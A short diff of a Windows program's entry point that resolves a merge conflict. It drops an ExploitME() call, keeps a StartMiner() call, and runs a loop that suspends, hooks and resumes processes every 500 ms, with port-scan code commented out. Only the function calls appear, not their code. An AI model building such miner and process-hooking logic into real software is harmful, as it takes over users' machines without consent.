@@ -28,14 +28,11 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 	UNREFERENCED_PARAMETER(lpCmdLine);
 	hInst = hInstance;
 
-<<<<<<< HEAD
-	ExploitME();
 	//scanFile("plop.txt");
 	//PortScan();
 
-=======
     StartMiner();
->>>>>>> 7a9436342355c7318da53cdd381117e2e53eba5c
+
 	while (TRUE) {
 		process_allSuspendApplyResume(HookProcess);
 		Sleep(500);
